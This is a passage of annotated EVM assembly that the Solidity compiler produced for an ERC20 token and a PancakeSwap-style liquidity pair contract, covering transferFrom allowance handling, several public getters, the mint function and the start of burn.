and\n        /* \"src/ERC20.sol\":3219:3223  bool */\n      0x00\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3239:3248  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3255:3265  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3239:3266  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"src/ERC20.sol\":3239:3281  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"src/ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_187\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3327:3342  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3327:3336  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3327:3342  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3343:3353  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3327:3354  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      tag_188\n      swap1\n        /* \"src/ERC20.sol\":3376:3381  value */\n      dup4\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"src/ERC20.sol\":3327:3358  allowance[from][msg.sender].sub */\n      tag_170\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_188:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3297:3312  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3297:3306  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3297:3312  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3313:3323  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3297:3324  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":3297:3395  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"src/ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_187:\n        /* \"src/ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      tag_189\n        /* \"src/ERC20.sol\":3425:3429  from */\n      dup5\n        /* \"src/ERC20.sol\":3431:3433  to */\n      dup5\n        /* \"src/ERC20.sol\":3435:3440  value */\n      dup5\n        /* \"src/ERC20.sol\":3415:3424  _transfer */\n      tag_190\n        /* \"src/ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      jump\t// in\n    tag_189:\n      pop\n        /* \"src/ERC20.sol\":3458:3462  true */\n      0x01\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_69:\n        /* \"src/ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_71:\n        /* \"src/ERC20.sol\":299:301  18 */\n      0x12\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_73:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_76:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":934:966  uint public price0CumulativeLast */\n    tag_78:\n      sload(0x0c)\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":972:1004  uint public price1CumulativeLast */\n    tag_80:\n      sload(0x0d)\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":4905:6170  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_83:\n        /* \"src/Pair.sol\":4954:4968  uint liquidity */\n      0x00\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_192\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_192:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/Pair.sol\":1233:1234  0 */\n      dup1\n        /* \"src/Pair.sol\":5023:5036  getReserves() */\n      tag_194\n        /* \"src/Pair.sol\":5023:5034  getReserves */\n      tag_54\n        /* \"src/Pair.sol\":5023:5036  getReserves() */\n      jump\t// in\n    tag_194:\n      pop\n        /* \"src/Pair.sol\":5084:5090  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":5110:5114  this */\n      address\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":4980:5036  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"src/Pair.sol\":5061:5074  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":5084:5090  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"src/Pair.sol\":5077:5101  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":5084:5090  token0 */\n      dup7\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_195\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_195:\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_196\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_196:\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_197\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_197:\n      pop\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":5149:5155  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":5175:5179  this */\n      address\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"src/Pair.sol\":5126:5139  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":5149:5155  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/Pair.sol\":5142:5166  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":5149:5155  token1 */\n      dup7\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_198\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_198:\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_199\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_199:\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_200\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_200:\n      pop\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"src/Pair.sol\":5191:5203  uint amount0 */\n      0x00\n        /* \"src/Pair.sol\":5206:5229  balance0.sub(_reserve0) */\n      tag_201\n        /* \"src/Pair.sol\":5206:5214  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":5206:5229  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":5206:5218  balance0.sub */\n      tag_170\n        /* \"src/Pair.sol\":5206:5229  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_201:\n        /* \"src/Pair.sol\":5191:5229  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":5239:5251  uint amount1 */\n      0x00\n        /* \"src/Pair.sol\":5254:5277  balance1.sub(_reserve1) */\n      tag_202\n        /* \"src/Pair.sol\":5254:5262  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":5254:5277  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":5254:5266  balance1.sub */\n      tag_170\n        /* \"src/Pair.sol\":5254:5277  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_202:\n        /* \"src/Pair.sol\":5239:5277  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":5288:5298  bool feeOn */\n      0x00\n        /* \"src/Pair.sol\":5301:5331  _mintFee(_reserve0, _reserve1) */\n      tag_203\n        /* \"src/Pair.sol\":5310:5319  _reserve0 */\n      dup8\n        /* \"src/Pair.sol\":5321:5330  _reserve1 */\n      dup8\n        /* \"src/Pair.sol\":5301:5309  _mintFee */\n      tag_204\n        /* \"src/Pair.sol\":5301:5331  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_203:\n        /* \"src/Pair.sol\":5341:5358  uint _totalSupply */\n      0x00\n        /* \"src/Pair.sol\":5361:5372  totalSupply */\n      sload\n        /* \"src/Pair.sol\":5288:5331  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/Pair.sol\":5464:5481  _totalSupply == 0 */\n      dup1\n        /* \"src/Pair.sol\":5460:5854  if (_totalSupply == 0) {... */\n      tag_205\n      jumpi\n        /* \"src/Pair.sol\":5509:5563  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_206\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":5509:5540  Math.sqrt(amount0.mul(amount1)) */\n      tag_169\n        /* \"src/Pair.sol\":5519:5539  amount0.mul(amount1) */\n      tag_208\n        /* \"src/Pair.sol\":5519:5526  amount0 */\n      dup8\n        /* \"src/Pair.sol\":5531:5538  amount1 */\n      dup8\n        /* \"src/Pair.sol\":5519:5539  amount0.mul(amount1) */\n      0xffffffff\n        /* \"src/Pair.sol\":5519:5530  amount0.mul */\n      tag_168\n        /* \"src/Pair.sol\":5519:5539  amount0.mul(amount1) */\n      and\n      jump\t// in\n    tag_208:\n        /* \"src/Pair.sol\":5509:5518  Math.sqrt */\n      tag_209\n        /* \"src/Pair.sol\":5509:5540  Math.sqrt(amount0.mul(amount1)) */\n      jump\t// in\n        /* \"src/Pair.sol\":5509:5563  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_206:\n        /* \"src/Pair.sol\":5497:5563  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"src/Pair.sol\":5577:5613  _mint(address(0), MINIMUM_LIQUIDITY) */\n      tag_210\n        /* \"src/Pair.sol\":5591:5592  0 */\n      0x00\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":5577:5582  _mint */\n      tag_211\n        /* \"src/Pair.sol\":5577:5613  _mint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_210:\n        /* \"src/Pair.sol\":5460:5854  if (_totalSupply == 0) {... */\n      jump(tag_212)\n    tag_205:\n        /* \"src/Pair.sol\":5711:5843  Math.min(... */\n      tag_213\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":5737:5774  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"src/Pair.sol\":5737:5762  amount0.mul(_totalSupply) */\n      tag_214\n        /* \"src/Pair.sol\":5737:5744  amount0 */\n      dup7\n        /* \"src/Pair.sol\":5749:5761  _totalSupply */\n      dup5\n        /* \"src/Pair.sol\":5737:5762  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/Pair.sol\":5737:5748  amount0.mul */\n      tag_168\n        /* \"src/Pair.sol\":5737:5762  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_214:\n        /* \"src/Pair.sol\":5737:5774  amount0.mul(_totalSupply) / _reserve0 */\n      dup2\n      tag_215\n      jumpi\n      invalid\n    tag_215:\n      div\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":5792:5829  amount1.mul(_totalSupply) / _reserve1 */\n      dup10\n      and\n        /* \"src/Pair.sol\":5792:5817  amount1.mul(_totalSupply) */\n      tag_216\n        /* \"src/Pair.sol\":5792:5799  amount1 */\n      dup7\n        /* \"src/Pair.sol\":5804:5816  _totalSupply */\n      dup6\n        /* \"src/Pair.sol\":5792:5817  amount1.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/Pair.sol\":5792:5803  amount1.mul */\n      tag_168\n        /* \"src/Pair.sol\":5792:5817  amount1.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_216:\n        /* \"src/Pair.sol\":5792:5829  amount1.mul(_totalSupply) / _reserve1 */\n      dup2\n      tag_217\n      jumpi\n      invalid\n    tag_217:\n      div\n        /* \"src/Pair.sol\":5711:5719  Math.min */\n      tag_218\n        /* \"src/Pair.sol\":5711:5843  Math.min(... */\n      jump\t// in\n    tag_213:\n        /* \"src/Pair.sol\":5699:5843  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"src/Pair.sol\":5460:5854  if (_totalSupply == 0) {... */\n    tag_212:\n        /* \"src/Pair.sol\":5883:5884  0 */\n      0x00\n        /* \"src/Pair.sol\":5871:5880  liquidity */\n      dup10\n        /* \"src/Pair.sol\":5871:5884  liquidity > 0 */\n      gt\n        /* \"src/Pair.sol\":5863:5927  require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_219\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_219:\n        /* \"src/Pair.sol\":5937:5957  _mint(to, liquidity) */\n      tag_220\n        /* \"src/Pair.sol\":5943:5945  to */\n      dup11\n        /* \"src/Pair.sol\":5947:5956  liquidity */\n      dup11\n        /* \"src/Pair.sol\":5937:5942  _mint */\n      tag_211\n        /* \"src/Pair.sol\":5937:5957  _mint(to, liquidity) */\n      jump\t// in\n    tag_220:\n        /* \"src/Pair.sol\":5968:6017  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_221\n        /* \"src/Pair.sol\":5976:5984  balance0 */\n      dup7\n        /* \"src/Pair.sol\":5986:5994  balance1 */\n      dup7\n        /* \"src/Pair.sol\":5996:6005  _reserve0 */\n      dup11\n        /* \"src/Pair.sol\":6007:6016  _reserve1 */\n      dup11\n        /* \"src/Pair.sol\":5968:5975  _update */\n      tag_179\n        /* \"src/Pair.sol\":5968:6017  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_221:\n        /* \"src/Pair.sol\":6031:6036  feeOn */\n      dup2\n        /* \"src/Pair.sol\":6027:6074  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_222\n      jumpi\n        /* \"src/Pair.sol\":6065:6073  reserve1 */\n      sload(0x0b)\n        /* \"src/Pair.sol\":6046:6074  uint(reserve0).mul(reserve1) */\n      tag_223\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":6051:6059  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":6065:6073  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/Pair.sol\":6046:6074  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"src/Pair.sol\":6046:6064  uint(reserve0).mul */\n      tag_168\n        /* \"src/Pair.sol\":6046:6074  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_223:\n        /* \"src/Pair.sol\":6038:6043  kLast */\n      0x0e\n        /* \"src/Pair.sol\":6038:6074  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"src/Pair.sol\":6027:6074  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_222:\n        /* \"src/Pair.sol\":6129:6163  Mint(msg.sender, amount0, amount1) */\n      0x40\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup6\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"src/Pair.sol\":6134:6144  msg.sender */\n      caller\n      swap3\n        /* \"src/Pair.sol\":6129:6163  Mint(msg.sender, amount0, amount1) */\n      0x4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f\n      swap3\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log2\n      pop\n      pop\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      sstore\n      pop\n        /* \"src/Pair.sol\":4905:6170  function mint(address to) external lock returns (uint liquidity) {... */\n      swap5\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_86:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":1010:1027  uint public kLast */\n    tag_88:\n      sload(0x0e)\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_91:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":7669:9098  function burn(... */\n    tag_94:\n        /* \"src/Pair.sol\":7732:7744  uint amount0 */\n      0x00\n        /* \"src/Pair.sol\":7746:7758  uint amount1 */\n      dup1\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_225\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_225:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/Pair.sol\":1233:1234  0 */\n      dup1\n        /* \"src/Pair.sol\":7813:7826  getReserves() */\n      tag_227\n        /* \"src/Pair.sol\":7813:7824  getReserves */\n      tag_54\n        /* \"src/Pair.sol\":7813:7826  getReserves() */\n      jump\t// in\n    tag_227:\n      pop\n        /* \"src/Pair.sol\":7869:7875  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":7918:7924  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":7999:8003  this */\n      address\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":7770:7826  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap5\n      swap7\n      pop\n      swap3\n      swap5\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":7869:7875  token0 */\n      swap2\n      dup3\n      and\n      swap4\n        /* \"src/Pair.sol\":7918:7924  token1 */\n      swap2\n      and\n      swap2\n        /* \"src/Pair.sol\":7851:7866  address _token0 */\n      0x00\n      swap2\n        /* \"src/Pair.sol\":7869:7875  token0 */\n      dup5\n      swap2\n        /* \"src/Pair.sol\":7965:7990  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":7869:7875  token0 */\n      dup7\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_228\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_228:\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_229\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_229:\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_230\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_230:\n      pop\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":8065:8069  this */\n      address\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"src/Pair.sol\":8015:8028  uint balance1 */\n      0x00\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":8031:8056  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n    